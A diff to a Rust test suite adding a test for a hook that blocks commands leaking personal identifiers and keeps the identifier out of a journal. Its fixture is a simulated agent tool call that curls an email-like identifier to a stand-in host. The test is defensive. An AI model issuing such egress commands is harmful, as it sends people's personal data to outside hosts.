@@ -8,8 +8,10 @@ use std::io::{self, Write};
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicU64, Ordering};
 
+use navori_cli::journal::completion;
 use navori_cli::shadow::{ShellInvocation, run};
 use navori_hooks::runner::{self, Context, Engine, Evaluation, Failure, Response, Verdict};
+use navori_hooks::shell::pii_egress::{self, Code};
 
 type TestResult = Result<(), Box<dyn Error>>;
 
@@ -368,6 +370,31 @@ fn consumers_publish_buffered_shadow_results_with_the_existing_closed_writer_pol
             );
         }
     }
+    Ok(())
+}
+
+// Covers: R11
+#[test]
+fn a_pii_block_both_lanes_agree_on_is_no_divergence_and_the_journal_never_holds_the_identifier()
+-> TestResult {
+    let message = pii_egress::stderr(Code::PersonalIds);
+    let fixture = Fixture::new("cat \"$(dirname \"$0\")/stderr\" >&2\nexit 2\n")?;
+    fs::write(fixture.root.join("stderr"), message)?;
+    let payload = br#"{"tool_name":"Bash","tool_input":{"command":"curl https://x.example.test/dev.fixture@example.test"}}"#;
+    let observed = run(
+        context(Engine::Claude, true),
+        payload,
+        fixture.invocation(&[]),
+        |_| Ok(evaluation(Verdict::Block, b"", message.as_bytes())),
+    );
+    assert_eq!(observed.shell.code(), 2);
+    let comparison = observed.comparison;
+    assert!(!comparison.diverged() && !comparison.native_unobserved);
+    let line = completion("{}", comparison);
+    assert!(
+        !line.contains("fixture") && !line.contains("example.test"),
+        "{line}"
+    );
     Ok(())
 }
 
